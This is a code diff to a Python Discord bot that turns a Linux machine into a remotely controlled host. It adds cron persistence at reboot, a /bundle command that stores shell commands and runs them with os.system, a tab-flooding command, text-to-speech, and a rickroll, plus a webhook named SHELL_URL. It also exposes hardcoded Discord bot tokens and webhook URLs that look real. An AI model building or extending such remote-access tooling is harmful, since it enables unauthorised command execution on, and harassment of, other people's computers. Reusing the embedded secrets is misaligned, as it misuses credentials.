@@ -10,13 +10,19 @@ import discord
 import subprocess
 import asyncio
 import psutil
-import glob  # Ensure you have this library installed using pip install psutil
+import glob
+import threading  # Ensure you have this library installed using pip install psutil
+
+
+BUNDLES_FILE = "bundles.txt"
 
 # Bot token (replace with your actual token)
-TOKEN = "MTMyMDExNTQ2NjM0MTA2MDY3MA.GnH6F4.CJGuAD6UtH0j0zd3qmDhyMQr3VZCBoRmzfykAc"
+TOKEN = "MTMyMDExNTQ2NjM0MTA2MDY3MA.GYdzJH.iDH_5vgBW4_B4BlsgmPY9ZhzClTQ7y6snc2TxI"
 
 # Discord Webhook URL
 WEBHOOK_URL = "https://discord.com/api/webhooks/1320057002033942610/7tE0LCCdk9d9LO3dejR_OO32gy8VdsynCA2tpHKmuMCRqyxcq2PiaE-dJSn2i4L_yNAu"
+
+SHELL_URL = "https://discord.com/api/webhooks/1320059351200956507/cOhNOi697hfXNSrkzOgcT5r2_gG3eCqm6S9Txas2mA6cw_8vPVNQaeDhdost5onfnX8X"
 
 # Setting up time
 start_time = time.time()
@@ -31,6 +37,24 @@ client = discord.Client(intents=intents)
 # Global variable to track the current working directory
 current_directory = os.path.expanduser("~")  # Default to the home directory
 
+
+def load_bundles():
+    if not os.path.exists(BUNDLES_FILE):
+        with open(BUNDLES_FILE, "w") as file:
+            pass
+    with open(BUNDLES_FILE, "r") as file:
+        return {line.split(":")[0]: line.strip().split(":")[1] for line in file.readlines()}
+
+
+def save_bundles(bundles):
+    with open(BUNDLES_FILE, "w") as file:
+        for name, commands in bundles.items():
+            file.write(f"{name}:{commands}\n")
+
+# Initialize bundles
+bundles = load_bundles()
+
+
 def setup_cron():
     """Automatically add the script to cron for @reboot."""
     try:
@@ -40,7 +64,6 @@ def setup_cron():
         # Check if the script is already in the cron list
         cron_jobs = subprocess.run(["crontab", "-l"], stdout=subprocess.PIPE, text=True)
         if script_path in cron_jobs.stdout:
-            print("Cron job already exists.")
             return
 
         # Add the script to the cron job list
@@ -775,6 +798,203 @@ async def on_message(message):
             await send_embed("Usage", "`/link [url]`\nExample: `/link https://google.com`")
 
 
+    elif message.content.startswith("/tab"):
+        partse = message.content.split(maxsplit=1)
+        if len(partse) > 1:
+            subcommand = partse[1].strip()
+            if subcommand.isdigit():  # Check if it's a number
+                number = int(subcommand)
+                if number > 0:
+                    try:
+                        for _ in range(number):
+                            subprocess.run(["xdg-open", "https://google.com"], check=True)
+                            await asyncio.sleep(0.001)  # 1 millisecond delay
+                        await send_embed("🌐 Tabs Opened", f"{number} new tabs were opened successfully.")
+                    except subprocess.CalledProcessError as e:
+                        await send_embed("Error", f"Failed to open tabs: `{str(e)}`", discord.Color.red())
+                    except Exception as e:
+                        await send_embed("Error", f"An unexpected error occurred: `{str(e)}`", discord.Color.red())
+                else:
+                    await send_embed("Error", "The number of tabs must be greater than 0.", discord.Color.red())
+            elif subcommand.lower().startswith("custom"):
+                try:
+                    args = subcommand.split(maxsplit=2)[1:]  # Extract URL and number
+                    if len(args) == 2:
+                        url = args[0].strip()
+                        number = int(args[1].strip())
+                        if number > 0:
+                            for _ in range(number):
+                                subprocess.run(["xdg-open", url], check=True)
+                                await asyncio.sleep(0.001)  # 1 millisecond delay
+                            await send_embed("🌐 Tabs Opened", f"{number} tabs with URL `{url}` were opened successfully.")
+                        else:
+                            await send_embed("Error", "The number of tabs must be greater than 0.", discord.Color.red())
+                    else:
+                        await send_embed("Error", "Invalid syntax. Use `/tab custom [url] [number]`.", discord.Color.red())
+                except ValueError:
+                    await send_embed("Error", "The number of tabs must be a valid integer.", discord.Color.red())
+                except subprocess.CalledProcessError as e:
+                    await send_embed("Error", f"Failed to open URL: `{str(e)}`", discord.Color.red())
+                except Exception as e:
+                    await send_embed("Error", f"An unexpected error occurred: `{str(e)}`", discord.Color.red())
+            else:
+                await send_embed("Usage", "`/tab`\nDefault opens https://google.com.\n\nCommands:\n`/tab [number]`: Opens the default new tab page multiple times.\n`/tab custom [url] [number]`: Opens a custom URL multiple times.", discord.Color.blue())
+        else:
+            await send_embed("Usage", "`/tab`\nDefault opens https://google.com.\n\nCommands:\n`/tab [number]`: Opens the default new tab page multiple times.\n`/tab custom [url] [number]`: Opens a custom URL multiple times.", discord.Color.blue())
+
+
+    elif message.content.startswith("/bundle"):
+        parts = message.content.split(maxsplit=3)
+
+        if len(parts) == 1:
+            # List saved bundles along with instructions
+            saved_bundles = "\n".join(
+                [f"- `{name}`: {commands}" for name, commands in bundles.items()]
+            ) or "No bundles saved yet."
+
+            await send_embed(
+                "💡 Bundle Command",
+                f"""
+**Usage:**
+- `/bundle [bundle_name]` - Execute a saved bundle.
+- `/bundle [bundle_name] [commands]` - Save or update a new bundle.
+- `/bundle delete [bundle_name]` - Delete a saved bundle.
+- `/bundle edit [bundle_name] [new_commands]` - Edit an existing bundle.
+- `/bundle` - Display instructions and a list of saved bundles.
+
+**Examples:**
+1. `/bundle MyBundle cd ~/BurpSuiteCommunity, ls`
+2. `/bundle MyBundle`
+3. `/bundle delete MyBundle`
+4. `/bundle edit MyBundle cd ~/NewDirectory, ls`
+
+**Saved Bundles:**
+{saved_bundles}
+""",
+                discord.Color.green()
+            )
+            return
+
+        if len(parts) >= 2:
+            command = parts[1]
+
+            # Handle deletion
+            if command == "delete" and len(parts) == 3:
+                bundle_name = parts[2]
+                if bundle_name in bundles:
+                    del bundles[bundle_name]
+                    save_bundles()
+                    await send_embed(
+                        "✅ Bundle Deleted",
+                        f"The bundle `{bundle_name}` has been deleted.",
+                        discord.Color.red()
+                    )
+                else:
+                    await send_embed(
+                        "❌ Error",
+                        f"The bundle `{bundle_name}` does not exist.",
+                        discord.Color.red()
+                    )
+                return
+
+            # Handle editing
+            elif command == "edit" and len(parts) == 4:
+                bundle_name = parts[2]
+                new_commands = parts[3]
+                if bundle_name in bundles:
+                    bundles[bundle_name] = new_commands
+                    save_bundles()
+                    await send_embed(
+                        "✅ Bundle Updated",
+                        f"The bundle `{bundle_name}` has been updated to: `{new_commands}`",
+                        discord.Color.green()
+                    )
+                else:
+                    await send_embed(
+                        "❌ Error",
+                        f"The bundle `{bundle_name}` does not exist.",
+                        discord.Color.red()
+                    )
+                return
+
+            # Save or execute bundle
+            bundle_name = parts[1]
+            if len(parts) == 3:  # Save a new bundle
+                commands = parts[2]
+                bundles[bundle_name] = commands
+                save_bundles()
+                await send_embed(
+                    "✅ Bundle Saved",
+                    f"The bundle `{bundle_name}` has been saved with commands: `{commands}`",
+                    discord.Color.green()
+                )
+            elif len(parts) == 2:  # Execute an existing bundle
+                if bundle_name in bundles:
+                    commands = bundles[bundle_name]
+                    for command in commands.split(","):
+                        command = command.strip()
+                        os.system(command)
+                    await send_embed(
+                        "✅ Bundle Executed",
+                        f"The bundle `{bundle_name}` has been executed.",
+                        discord.Color.green()
+                    )
+                else:
+                    await send_embed(
+                        "❌ Error",
+                        f"The bundle `{bundle_name}` does not exist.",
+                        discord.Color.red()
+                    )
+                    
+    elif message.content.startswith("/speak"):
+        eparts = message.content.split(maxsplit=2)
+
+        if len(eparts) == 1:
+            # If only the /speak command is given, prompt for usage
+            await send_embed("Usage", "/speak [gender] [text] or /speak [text]")
+        elif len(eparts) == 2:
+            # If only text is provided, use default voice
+            text_to_speak = eparts[1]
+            try:
+                # Run the espeak command with the default voice
+                subprocess.run(["espeak", text_to_speak], check=True)
+                await send_embed("🗣️ Speaking", f"The bot is saying: '{text_to_speak}'")
+            except Exception as e:
+                await send_embed("Error", f"Failed to speak the text: {str(e)}", discord.Color.red())
+        elif len(eparts) == 3:
+            # If gender and text are provided, adjust voice based on gender
+            gender = eparts[1].lower()
+            text_to_speak = eparts[2]
+
+            # Choose the voice based on gender
+            if gender == "male":
+                voice = "en+m3"  # Male voice
+            elif gender == "female":
+                voice = "en+f3"  # Female voice
+            else:
+                await send_embed("Usage", "/speak [gender] [text] (gender: Male or Female)")
+                return
+
+            try:
+                # Run the espeak command with the chosen voice and ensure the full sentence is passed correctly
+                subprocess.run(["espeak", "-v", voice, f'"{text_to_speak}"'], check=True)
+                await send_embed("🗣️ Speaking", f"The bot is saying: '{text_to_speak}' in a {gender} voice.")
+            except Exception as e:
+                await send_embed("Error", f"Failed to speak the text: {str(e)}", discord.Color.red())
+            
+    elif message.content.strip() == "/rickroll":
+        await send_embed("Rickrolling..", "Attempting to Rickroll.")
+        try:
+            result = subprocess.run(["xdg-open", "https://rickroll-omega.vercel.app/rickroll-but-short.mp3"], check=True)
+            if result.returncode == 0:
+                await send_embed("✅ Success", "Rickroll has been planted! :D")
+            else:
+                error_message = result.stderr or "Unknown error occurred."
+                await send_embed("Error", f"Failed to Rickroll:\n`{error_message}`", discord.Color.red())
+        except FileNotFoundError:
+            await send_embed("Error", f"Rickrolling is unavailable.. :( Error: {error_message}", discord.Color.red())
+        except Exception as e:
+            await send_embed("Error", f"An unexpected error occurred: `{str(e)}`", discord.Color.red())
 
 # Daemonize the script (optional)
 def daemonize():
